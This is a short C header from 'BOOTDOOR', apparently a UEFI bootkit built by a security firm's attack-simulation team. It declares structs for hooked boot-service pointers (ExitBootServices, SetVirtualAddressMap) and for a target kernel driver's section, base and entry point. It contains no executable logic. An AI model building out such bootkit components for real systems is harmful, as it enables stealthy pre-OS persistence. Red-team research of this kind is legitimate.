/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	PVOID	ExitBootServices;
	PVOID	SetVirtualAddressMap;
} EFTBL, *PEFTBL ;

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	ULONG	BufferSize;
	PVOID	BufferBase;
	PVOID	KernelBase;
	PVOID	ImageAddrPhy;
	PVOID	ImageAddrVir;
	PVOID	TargetDriverSection;
	PVOID	TargetDriverImageBase;
	PVOID	TargetDriverLoaderEntry;
	ULONG	TargetDriverAddressOfEntryPoint;
} RNTBL, *PRNTBL ;
